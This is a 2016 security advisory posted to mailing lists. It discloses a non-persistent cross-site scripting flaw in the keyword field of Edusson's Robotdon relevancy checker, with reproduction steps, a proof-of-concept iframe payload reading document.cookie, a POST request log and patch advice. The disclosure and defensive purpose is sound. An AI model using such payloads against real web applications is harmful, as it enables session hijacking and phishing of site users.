
Date: Mon, 7 Nov 2016 11:06:09 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Edusson (Robotdon) - Client Side Cross Site Scripting Vulnerability

Document Title:
===============
Edusson (Robotdon) BB - Client Side Cross Site Scripting Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1871


Release Date:
=============
2016-11-04


Vulnerability Laboratory ID (VL-ID):
====================================
1871


Common Vulnerability Scoring System:
====================================
3.4


Product & Service Introduction:
===============================
Meet Robot Don - a free essay checker software that brings so much fun into your essay editing / proofreading.
We have created Robot Don, machine learning tool that facilitates essay writing, free for all students. We continuously 
receive bug reports and suggestions from different areas. To honor the bright external contributions that help us 
build a better product we have  launched a Bug & Ideas Hunting (BIH) Contest for Robot Don. Any of service or feature 
provided by Robot Don software is intended to be in scope of this scholarship/ contest. This includes all content and 
algos available through robotdon.com

(Copy of the Vendor Homepage: http://edusson.com/robot-don )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a client-side cross site scripting web vulnerability in the official Edusson Robotdon web-application.


Vulnerability Disclosure Timeline:
==================================
2016-06-10: Researcher Notification & Coordination (Benjamin Kunz Mejri)
2016-06-11: Vendor Notification (Edusson Security Team)
2016-06-20: Vendor Response/Feedback (Edusson Security Team)
2016-**-**: Vendor Fix/Patch (Edusson Robotdon Developer Team)
2016-11-04: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Edusson
Product: Robotdon - Online Service (Web-Application) 2016 Q2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A client-side cross site scripting web vulnerability has been discovered in the official Edusson RobtoDon (Tools) online service web-application.
The non-persistent vulnerability allows remote attackers to inject own malicious script codes on client-side browser to web-application requests.

The vulnerability is located in the keyword parameter of the relevancy module POST method request. Remote attackers are able to inject own 
malicious script codes to the Check  input context with the vulnerable keyword parameter. The injection point of the vulnerability is the 
Check input form with the wrong encoded keyword parameter. The execution point occurs in the error exception-handling of the check module 
within the displayed invalid context. The attacker vector of the vulnerability is non-persistent on the client-side and the request method 
to inject the payload is POST. The vulnerability allows an attacker to inject malicious codes to the non-protected queue of the check with 
the vulnerable exception. The error code is marked with a automated information to report the error (alert alert-danger ps fix!) which has 
been resolved by thus report.

The security risk of the client-side vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.4. 
Exploitation of the persistent non-persistent web vulnerability requires a low privileged user account and only low user interaction (click). 
Successful exploitation of the vulnerability results in non-persistent phishing, session hijacking, non-persistent external redirect to 
malicious sources and client-side manipulation of affected or connected module context.

Request Method(s):
				[+] POST

Vulnerable Module(s)
				[+] Relevancy (robotdon)
 
Vulnerable Input(s):
				[+] Check

Vulnerable Parameter(s)
				[+] keyword

Affected Module(s)
				[+] Exception-Handling - Message Context on Error


Proof of Concept (PoC):
=======================
The non-persistent cross site web vulnerability can be exploited by remote attackers with low privileged user account and low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


Manaul steps to reproduce the vulnerability ... 
1. Open the company website and login to your low privileged user account
2. Click the Relevancy module
3. Inject the test payload to the input field
4. Click the check button to process the POST method request
5. The code executes in the exception of the invalid keyword input within the website context
6. Successful reproduce of the vulnerability


PoC: Vulnerable Source
<div class="alert alert-danger">Text is not relevant specified word. Word &gt;"<iframe src="http://www.vulnerability-lab.com" onload="alert(document.cookie)" <="" found="" 
0="" times.="" required="" minimum="" 0%="" (1="" times).="" <br=""></iframe><br> <span style="color: black;"><b>Please take note that the system understands the word in any case.  
But, now to extract the root of the word is used "Porter Stemming Algorithm". It is not 100% accurate, so some words root extracts inaccurate.  You can tell us about bugs on 
the contact page and we will fix it.</b></span> </div>


PoC: Payload(s)
>"<iframe src=http://www.vulnerability-lab.com onload=alert(document.cookie) <


--- PoC Session Logs [POST] (Inject) ---
Status: 200[OK]
POST http://tools.robotdon.com/ajax?task_id=7386&analyzer_id=8 
Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE  ] 
Größe des Inhalts[-1] Mime Type[text/html]
   Request Header:
      Host[tools.robotdon.com]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0]
      Accept[text/plain, */*; q=0.01]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      DNT[1]
      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
      X-Requested-With[XMLHttpRequest]
      Referer[http://tools.robotdon.com/newtask?task_id=7386]
      Content-Length[104]
      Cookie[0f1778c82ad1715aef78be8d9da4ee04=7298df7937d9555eb77ccf1c06968e48; 2f00c2f84fa5965efa788d744aff48df=239e3345546d3a3b9d2adeaaee49c9db; 
	fba0bdf0f6ffd12abb4a8ce1e6e57539=b5cdb8d8c39c446edaf3ae0405849a61; 0f918dd46f0491f24e18f0890a51b0a7=0d941d41c436a42917a3682b7dfa73c6; 
	dba6f8a066439e2a2bbb12b02e030b5c=265e210d7713815a0092515cd4766ce3]
      Connection[keep-alive]
   POST-Daten:
      keyword[%3E%22%3Ciframe+src%3Dhttp%3A%2F%2Fwww.vulnerability-lab.com+onload%3Dalert(document.cookie)+%3C]
   Response Header:
      Server[nginx/1.6.2]
      Date[Sat, 11 Jun 2016 15:24:16 GMT]
      Content-Type[text/html; charset=UTF-8]
      Transfer-Encoding[chunked]
      Connection[keep-alive]
      Content-Encoding[gzip]


Reference(s):
http://tools.robotdon.com/
http://tools.robotdon.com/ajax
http://tools.robotdon.com/newtask
http://tools.robotdon.com/ajax?task_id
http://tools.robotdon.com/ajax?task_id=&analyzer_id=


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse and encode of the vulnerable check input field in the relevancy module.
Restrict the post method request and parse the keyword value by disallowing the usage of special chars to prevent client-side 
script code injection attacks. Parse the exception error output context that displays the input again with insecure encode.


Security Risk:
==============
The security risk of the client-side cross site scripting web vulnerability in the robotdon web-application is estimated as medium. (CVSS 3.4)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (research@...nerability-lab.com) [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.] [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or implied, 
including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage, 
including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised 
of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing 
limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 				- admin@...lution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically 
redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or 
its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific 
authors or managers. To record, list, modify, use or edit our material contact (admin@ or research@...nerability-lab.com) to get a ask permission.

				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™

-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com


